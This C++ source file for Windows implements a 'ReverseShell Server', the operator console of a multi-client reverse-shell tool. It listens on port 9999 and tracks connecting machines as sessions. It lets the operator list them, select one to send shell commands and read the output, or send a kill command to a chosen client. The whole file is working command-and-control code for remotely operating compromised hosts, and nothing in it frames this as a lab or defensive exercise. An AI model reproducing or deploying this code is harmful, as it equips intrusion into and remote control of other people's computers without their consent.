#include <winsock2.h>
#include <Ws2tcpip.h>
#include <windows.h>
#include <string>
#include <iostream>
#include <thread>
#include <locale>
#include <vector>

#pragma comment(lib,"ws2_32.lib")

static int PORT = 9999;

class Session {
public:
	typedef void(*mReceivedPacket)(Session* source, std::string data);
	typedef void(*mDisconnected)(Session* source);

	static DWORD WINAPI StartRecieveThread(LPVOID lpParam) {
		if (!lpParam) return 0;
		Session* session = (Session*)lpParam;
		session->TaskReceive();
		return 1;
	}

	std::string ip;
	SOCKET sock;
	bool connected = true;
	mReceivedPacket recvListener;
	mDisconnected disconnectedListener;
	bool firstTime = true;

	Session(SOCKET sockParam, std::string ipParam, mReceivedPacket recvListenerParam, mDisconnected disconnectedListenerParam)
		: sock(sockParam), ip(ipParam), recvListener(recvListenerParam), disconnectedListener(disconnectedListenerParam) {
		DWORD dwThreadReceiveID;
		CreateThread(NULL, 0, StartRecieveThread, this, 0, &dwThreadReceiveID);
	}

	void TaskReceive() {
		while (connected) {
			int bufferLength = 4096;
			char buffer[4096];
			int iResult;

			iResult = recv(sock, buffer, bufferLength, 0);

			if (iResult > 0) {
				std::string req = std::string(buffer, buffer + iResult);
				recvListener(this, req);
			}
			else {
				closesocket(sock);
				connected = false;
				disconnectedListener(this);
			}

			Sleep(1);
		}
	}
	
};

SOCKET serverSocket;
std::vector<Session*> sessions;
Session* active;

std::string NormalizedIPString(SOCKADDR_IN addr, bool withPort = false) {
	char host[16];
	ZeroMemory(host, 16);
	inet_ntop(AF_INET, &addr.sin_addr, host, 16);

	USHORT port = ntohs(addr.sin_port);

	int realLen = 0;
	for (int i = 0; i < 16; i++) {
		if (host[i] == '\00') {
			break;
		}
		realLen++;
	}

	std::string res(host, realLen);
	if(withPort)res += ":" + std::to_string(port);

	return res;
}

void TaskInput() {
	while (true) {
		std::string response;
		getline(std::cin, response);
		
		if (response == "cls") {
			system("cls");
			std::cout << "ReverseShell> ";
		} else
		if (active != nullptr) {
			if (response == "exit") {
				std::string cmd = "1stop";
				send(active->sock, cmd.c_str(), cmd.length(), 0);
				std::cout << "Session closed " << active->ip << std::endl;
				std::cout << "ReverseShell> ";
				active = nullptr;
			} else {
				response = '0' + response + '\n';
				send(active->sock, response.c_str(), response.length(), 0);
			}
		} else {
			if (response == "list") {
				std::cout << std::endl << "Clients (Index, IP)" << std::endl;
				for (int i = 0; i < sessions.size(); i++) {
					std::cout << i << ": " << sessions[i]->ip << std::endl;
				}
				std::cout << std::endl;
				std::cout << "ReverseShell> ";
			}
			else if (response.substr(0, 7) == "select ") {
				int currSession = stoi(response.substr(7));
				std::string cmd = "1start";

				std::cout << "Session created " << sessions[currSession]->ip << std::endl;
				std::cout << "Type 'exit' to close the session." << std::endl << std::endl;

				active = sessions[currSession];				
				send(active->sock, cmd.c_str(), cmd.length(), 0);
				
				if (!active->firstTime) {
					cmd = "0\n";
					send(active->sock, cmd.c_str(), cmd.length(), 0);
				}

				active->firstTime = false;
			}
			else if (response.substr(0, 5) == "kill ") {
				int currSession = stoi(response.substr(5));
				std::string cmd = "1kill";

				send(sessions[currSession]->sock, cmd.c_str(), cmd.length(), 0);
			}
			else {
				std::cout << "Unknown command: " << response << std::endl;
				std::cout << "ReverseShell> ";
			}
		}

		Sleep(1);
	}
}

void ReceivedPacket(Session* source, std::string data) {
	if (source == active) {
		std::cout << data;
	}
}

void Disconnected(Session* source) {
	if (source == active) {
		std::cout << std::endl << "Session closed " << active->ip << std::endl;		
		active = nullptr;				
	}
	for (int i = 0; i < sessions.size(); i++) {
		if (sessions[i] == source) {
			sessions.erase(sessions.begin() + i);
			break;
		}
	}
	std::cout << std::endl << "Client disconnected " << source->ip << std::endl;
	std::cout << "ReverseShell> ";
}

int main() {
	SetConsoleTitleA("ReverseShell Server");

	std::cout << "ReverseShell> ";

	WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
		return 0;
	}

	SOCKADDR_IN sockAddr;
	sockAddr.sin_port = htons(PORT);
	sockAddr.sin_family = AF_INET;
	sockAddr.sin_addr.s_addr = htonl(INADDR_ANY);

	serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (bind(serverSocket, (LPSOCKADDR)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR) {
		return 0;
	}

	listen(serverSocket, 1000);
	
	std::thread threadInput = std::thread(TaskInput);

	while (true) {
		SOCKADDR_IN clientAddr;
		int clientSize = sizeof(clientAddr);
		SOCKET clientSocket = accept(serverSocket, (sockaddr*)&clientAddr, &clientSize);
		std::string ip = NormalizedIPString(clientAddr, false);
		std::cout << std::endl << "New client connected " << ip << " on slot " << sessions.size() << std::endl << std::endl;
		std::cout << "ReverseShell> ";

		Session* session = new Session(clientSocket, ip, &ReceivedPacket, &Disconnected);
		sessions.push_back(session);
	}

	closesocket(serverSocket);
	WSACleanup();
}
